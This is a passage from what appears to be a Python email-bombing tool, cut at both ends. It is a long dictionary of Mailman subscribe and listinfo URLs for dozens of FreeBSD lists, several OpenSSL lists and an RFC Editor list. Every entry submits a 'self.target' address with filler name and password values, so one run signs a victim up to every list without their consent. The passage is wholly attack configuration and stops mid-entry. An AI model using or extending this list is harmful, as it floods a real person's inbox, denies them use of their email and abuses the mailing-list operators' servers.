                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MJyUz': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-rc',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-rc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rXxEq': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-realtime',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-realtime',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bwzFU': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-reproducibility',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-reproducibility',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WAXVI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-riscv',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-riscv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mhUTz': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ruby',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ruby',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KRKQt': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-scsi',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-scsi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XgUYx': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-security',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-security',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FNhwe': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-security-notifications',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-security-notifications',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pNcIu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-snapshots',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-snapshots',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'suEXr': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-sparc64',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-sparc64',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tpqWG': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-stable',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-stable',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DIGPZ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-standards',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-standards',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wvWoC': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-sysinstall',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-sysinstall',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JKnPi': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-tcltk',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-tcltk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'teyLu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-teaching',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-teaching',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TQnUJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-test',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-test',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EcHOK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-testing',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-testing',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EoOVT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-tex',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-tex',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OPNEX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-threads',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-threads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kCcqX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-tilera',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-tilera',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hSopx': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-tinderbox',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-tinderbox',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cDZmI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-tokenring',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-tokenring',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dktwo': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-toolchain',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-toolchain',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NIyOC': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-translators',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-translators',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gnZcU': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-transport',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-transport',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uUWxf': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-uboot',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-uboot',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FGukT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-usb',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-usb',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ndkWo': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-user-groups',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-user-groups',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PkCrN': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-users-jp',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-users-jp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SBbRg': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-virtualization',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-virtualization',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kokiQ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-vuxml',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-vuxml',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aRyon': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-wip-status',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-wip-status',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NAlhL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-wireless',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-wireless',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kRCLr': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-women',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-women',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },

            'CgOtX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-www',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-www',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wkNgp': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-x11',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-x11',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mjuLu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-xen',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-xen',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SMMhK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-xfce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-xfce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lETpL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-zope',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-zope',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wIcbm': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/netperf-users',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/netperf-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vPuLw': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/p4-projects',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/p4-projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gLANM': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/p4-releng',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/p4-releng',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gCfoI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/posix1e',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/posix1e',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uPGTE': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/soc-status',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/soc-status',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Vsmez': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AyOjK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-head',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-head',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EMffi': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-projects',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tdkgA': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-svnadmin',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-svnadmin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'njknv': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-translations',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-translations',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FdeCm': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-doc-user',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-doc-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IgpkV': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HhqZv': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-branches',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-branches',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kiIDY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-head',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-head',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bjbzu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-projects',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RfbwV': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-svnadmin',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-svnadmin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uiLWb': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-ports-tags',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-ports-tags',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fLPWh': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-soc-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-soc-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kRiug': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pTkqr': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-head',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-head',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iSTuD': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-projects',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-projects',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YfAFA': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-release',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-release',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'onuAT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-releng',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-releng',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QZIVq': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vypDX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-10',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-10',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fBsjb': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-11',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-11',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qZdXl': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-12',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-12',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fjFPu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-6',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-6',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zibUJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-7',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-7',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BMyyV': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-8',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-8',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YVAKU': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-9',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-9',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SGOqw': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-stable-other',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-stable-other',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iifBQ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-svnadmin',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-svnadmin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YQxQu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-user',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IBsbV': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/svn-src-vendor',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/svn-src-vendor',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZrxVf': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/trustedbsd-announce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/trustedbsd-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TYDwk': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/trustedbsd-audit',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/trustedbsd-audit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OEdiS': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/trustedbsd-cvs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/trustedbsd-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aizDt': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/trustedbsd-discuss',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/trustedbsd-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UpJiJ': {
                'url': 'https://mta.openssl.org/mailman/subscribe/openssl-announce',
                'token_url': 'https://mta.openssl.org/mailman/listinfo/openssl-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RXjTG': {
                'url': 'https://mta.openssl.org/mailman/subscribe/openssl-commits',
                'token_url': 'https://mta.openssl.org/mailman/listinfo/openssl-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qrppu': {
                'url': 'https://mta.openssl.org/mailman/subscribe/openssl-project',
                'token_url': 'https://mta.openssl.org/mailman/listinfo/openssl-project',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JBmdg': {
                'url': 'https://mta.openssl.org/mailman/subscribe/openssl-users',
                'token_url': 'https://mta.openssl.org/mailman/listinfo/openssl-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oPiis': {
                'url': 'https://mta.openssl.org/mailman/subscribe/wiki',
                'token_url': 'https://mta.openssl.org/mailman/listinfo/wiki',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GvBVk': {
                'url': 'https://www.rfc-editor.org/mailman/subscribe/c238',
